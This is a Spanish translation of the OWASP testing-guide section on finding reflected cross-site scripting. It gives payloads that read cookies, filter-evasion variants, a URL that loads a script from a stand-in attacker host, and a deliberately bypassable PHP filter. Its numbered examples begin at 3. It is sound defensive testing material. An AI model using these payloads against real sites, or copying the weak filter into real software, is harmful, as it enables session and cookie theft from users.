Cross Site Scripting reflejado

ID
WSTG-INJT-01

Resumen

El Cross-site Scripting (XSS) reflejado ocurre cuando un atacante inyecta código ejecutable por el navegador dentro de una única respuesta HTTP. El ataque inyectado no se almacena en la aplicación; es no persistente y solo afecta a los usuarios que abren un enlace o una página web de terceros manipulados con fines maliciosos. La cadena de ataque se incluye como parte de la URI o de los parámetros HTTP elaborados, la aplicación la procesa de forma incorrecta y se devuelve a la víctima.

Los XSS reflejados son el tipo de ataque XSS más frecuente en la práctica. También se conocen como ataques XSS no persistentes y, dado que el payload (carga útil) del ataque se entrega y se ejecuta mediante una única petición y respuesta, se les denomina también XSS de primer orden o de tipo 1.

Cuando una aplicación web es vulnerable a este tipo de ataque, devuelve al cliente, sin validar, la entrada enviada en las peticiones. El modus operandi habitual del ataque incluye un paso de diseño, en el que el atacante crea y prueba una URI maliciosa; un paso de ingeniería social, en el que convence a sus víctimas de cargar esa URI en sus navegadores; y, finalmente, la ejecución del código malicioso mediante el navegador de la víctima.

Por lo general, el código del atacante está escrito en el lenguaje JavaScript, pero también pueden usarse otros lenguajes de scripting como ActionScript y VBScript. Los atacantes suelen aprovechar estas vulnerabilidades para instalar key loggers, robar las cookies de la víctima, robar el contenido del portapapeles y modificar el contenido de la página (por ejemplo, los enlaces de descarga).

Una de las principales dificultades para prevenir las vulnerabilidades XSS es la correcta codificación de caracteres. En algunos casos, el servidor web o la aplicación web podrían no estar filtrando algunas codificaciones de los caracteres; así, por ejemplo, la aplicación web podría filtrar <script>, pero no %3cscript%3e, que simplemente incluye otra codificación de las etiquetas.

Objetivos de la prueba

  • Identificar las variables que se reflejan en las respuestas.
  • Evaluar la entrada que aceptan y la codificación que se aplica al devolverla (si la hay).

Cómo probar

Pruebas de caja negra

Una prueba de caja negra incluirá al menos tres fases:

Detectar los vectores de entrada

Detectar los vectores de entrada. Para cada página web, el evaluador debe determinar todas las variables definidas por el usuario de la aplicación web y la forma de introducirlas. Esto incluye entradas ocultas o poco evidentes, como parámetros HTTP, datos POST, valores de campos ocultos de formularios y valores predefinidos de botones de opción o de selección. Normalmente se usan editores HTML integrados en el navegador o proxies web para ver estas variables ocultas. Véase el ejemplo siguiente.

Analizar los vectores de entrada

Analizar cada vector de entrada para detectar posibles vulnerabilidades. Para detectar una vulnerabilidad XSS, el evaluador usará normalmente datos de entrada especialmente elaborados con cada vector de entrada. Dichos datos suelen ser inofensivos, pero provocan respuestas del navegador web que ponen de manifiesto la vulnerabilidad. Los datos de prueba pueden generarse con un fuzzer de aplicaciones web, con una lista automatizada y predefinida de cadenas de ataque conocidas o de forma manual. Algunos ejemplos de esos datos de entrada son los siguientes:

  • <script>alert(123)</script>
  • "><script>alert(document.cookie)</script>

Para una lista completa de posibles cadenas de prueba, véase la XSS Filter Evasion Cheat Sheet.

Comprobar el impacto

Para cada entrada de prueba intentada en la fase anterior, el evaluador analizará el resultado y determinará si representa una vulnerabilidad con un impacto realista en la seguridad de la aplicación web. Esto requiere examinar el HTML de la página web resultante y buscar en él la entrada de prueba. Una vez encontrada, el evaluador identifica los caracteres especiales que no se codificaron, reemplazaron o filtraron correctamente. El conjunto de caracteres especiales vulnerables sin filtrar dependerá del contexto de esa sección del HTML.

Idealmente, todos los caracteres especiales de HTML se reemplazarán por entidades HTML. Las entidades HTML clave que hay que identificar son:

  • > (mayor que)
  • < (menor que)
  • & (ampersand)
  • ' (apóstrofo o comilla simple)
  • " (comilla doble)

Sin embargo, las especificaciones de HTML y XML definen una lista completa de entidades. Wikipedia tiene una referencia completa.

En el contexto de una acción HTML o de código JavaScript, será necesario escapar, codificar, reemplazar o filtrar otro conjunto de caracteres especiales. Estos caracteres incluyen:

  • \n (nueva línea)
  • \r (retorno de carro)
  • ' (apóstrofo o comilla simple)
  • " (comilla doble)
  • \ (barra invertida)
  • \uXXXX (valores unicode)

Para una referencia más completa, véase la guía de JavaScript de Mozilla.

Evasión de filtros XSS

Los ataques de cross-site scripting reflejado se previenen cuando la aplicación web sanitiza la entrada, cuando un web application firewall bloquea la entrada maliciosa o mediante mecanismos integrados en los navegadores web modernos. El evaluador debe probar las vulnerabilidades suponiendo que los navegadores web no impedirán el ataque. Los navegadores pueden estar desactualizados o tener desactivadas las funciones de seguridad integradas. De igual forma, no está garantizado que los web application firewalls reconozcan ataques nuevos y desconocidos. Un atacante podría elaborar una cadena de ataque que el web application firewall no reconozca.

Por tanto, la mayor parte de la prevención del XSS debe depender de la sanitización que haga la aplicación web de la entrada no confiable del usuario. Los desarrolladores disponen de varios mecanismos de sanitización, como devolver un error, eliminar, codificar o reemplazar la entrada no válida. El modo en que la aplicación detecta y corrige la entrada no válida es otra de las principales debilidades en la prevención del XSS. Una lista de denegación (deny list) puede no incluir todas las posibles cadenas de ataque, una lista de permitidos (allow list) puede ser demasiado permisiva, la sanitización puede fallar o se puede confiar indebidamente en un tipo de entrada y dejarla sin sanitizar. Todo ello permite a los atacantes eludir los filtros XSS.

La XSS Filter Evasion Cheat Sheet documenta pruebas comunes de evasión de filtros.

Ejemplo 3: valor de atributo de una etiqueta

Dado que estos filtros se basan en listas de denegación, podrían no bloquear todos los tipos de expresiones. De hecho, hay casos en los que un exploit XSS puede llevarse a cabo sin usar etiquetas <script> e incluso sin usar caracteres como < y >, que suelen filtrarse.

Por ejemplo, la aplicación web podría usar el valor introducido por el usuario para rellenar un atributo, como se muestra en el siguiente código:

<input type="text" name="state" value="INPUT_FROM_USER">

Entonces un atacante podría enviar el siguiente código:

" onfocus="alert(document.cookie)

Ejemplo 4: sintaxis o codificación diferente

En algunos casos es posible que los filtros basados en firmas puedan derrotarse simplemente ofuscando el ataque. Normalmente esto se logra insertando variaciones inesperadas en la sintaxis o en la codificación. Los navegadores toleran estas variaciones como HTML válido cuando se devuelve el código, y aun así el filtro también podría aceptarlas.

A continuación, algunos ejemplos:

  • "><script >alert(document.cookie)</script >
  • "><ScRiPt>alert(document.cookie)</ScRiPt>
  • "%3cscript%3ealert(document.cookie)%3c/script%3e

Ejemplo 5: evasión de un filtrado no recursivo

A veces la sanitización se aplica una sola vez y no se realiza de forma recursiva. En este caso, el atacante puede vencer al filtro enviando una cadena que contenga varios intentos, como esta:

<scr<script>ipt>alert(document.cookie)</script>

Ejemplo 6: inclusión de un script externo

Supongamos ahora que los desarrolladores del sitio objetivo implementaron el siguiente código para proteger la entrada frente a la inclusión de scripts externos:

<?
    $re = "/<script[^>]+src/i";

    if (preg_match($re, $_GET['var']))
    {
        echo "Filtered";
        return;
    }
    echo "Welcome ".$_GET['var']." !";
?>

Descomponiendo la expresión regular anterior:

  1. Comprobar la presencia de <script
  2. Comprobar la presencia de un " " (espacio en blanco)
  3. Cualquier carácter excepto >, una o más veces
  4. Comprobar la presencia de src

Esto es útil para filtrar expresiones como <script src="https://attacker/xss.js"></script>, que es un ataque común. Pero, en este caso, es posible eludir la sanitización usando el carácter > en un atributo entre script y src, de esta manera:

https://example/?var=<SCRIPT%20a=">"%20SRC="https://attacker/xss.js"></SCRIPT>

Esto explotará la vulnerabilidad de cross site scripting reflejado mostrada antes, ejecutando el código JavaScript almacenado en el servidor web del atacante como si se originara en el sitio de la víctima, https://example/.

Ejemplo 7: HTTP Parameter Pollution (HPP)

Otro método para eludir filtros es la contaminación de parámetros HTTP (HTTP Parameter Pollution). Esta técnica fue presentada por primera vez por Stefano di Paola y Luca Carettoni en 2009 en la conferencia OWASP Polonia. Véase HTTP Parameter pollution para más información. Esta técnica de evasión consiste en dividir un vector de ataque entre varios parámetros que tienen el mismo nombre. La manipulación del valor de cada parámetro depende de cómo cada tecnología web analice dichos parámetros, por lo que este tipo de evasión no siempre es posible. Si el entorno evaluado concatena los valores de todos los parámetros con el mismo nombre, un atacante podría usar esta técnica para eludir mecanismos de seguridad basados en patrones. Ataque normal:

https://example/page.php?param=<script>[...]</script>

Ataque usando HPP:

https://example/page.php?param=<script&param=>[...]</&param=script>

Véase la XSS Filter Evasion Cheat Sheet para una lista más detallada de técnicas de evasión de filtros. Por último, analizar las respuestas puede resultar complejo. Una forma sencilla de hacerlo es usar código que muestre un cuadro de diálogo, como en nuestro ejemplo. Esto suele indicar que un atacante podría ejecutar JavaScript arbitrario de su elección en los navegadores de los visitantes.

Pruebas de caja gris

Las pruebas de caja gris son similares a las de caja negra. En ellas, el pentester tiene un conocimiento parcial de la aplicación. En este caso, el pentester podría conocer información sobre la entrada del usuario, los controles de validación de entrada y la forma en que la entrada del usuario se devuelve al usuario.

Si se dispone del código fuente (pruebas de caja blanca), deben analizarse todas las variables recibidas de los usuarios. Además, el evaluador debe analizar los procedimientos de sanitización implementados para decidir si pueden eludirse.

Herramientas

  • Hackvertor es una herramienta en línea que permite muchos tipos de codificación y ofuscación de JavaScript (o de cualquier cadena de entrada).
  • BeEF es el browser exploitation framework. Una herramienta profesional para demostrar el impacto en tiempo real de las vulnerabilidades de los navegadores.
  • ratproxy es una herramienta de auditoría de seguridad de aplicaciones web semiautomatizada y en gran parte pasiva, optimizada para la detección precisa y sensible, y la anotación automática, de posibles problemas y patrones de diseño relevantes para la seguridad, basadas en la observación del tráfico existente iniciado por el usuario en entornos complejos de web 2.0.
  • Burp Proxy es un servidor proxy HTTP/S interactivo para atacar y probar aplicaciones web.
  • Zed Attack Proxy (ZAP) es un servidor proxy HTTP/S interactivo para atacar y probar aplicaciones web con un escáner integrado.
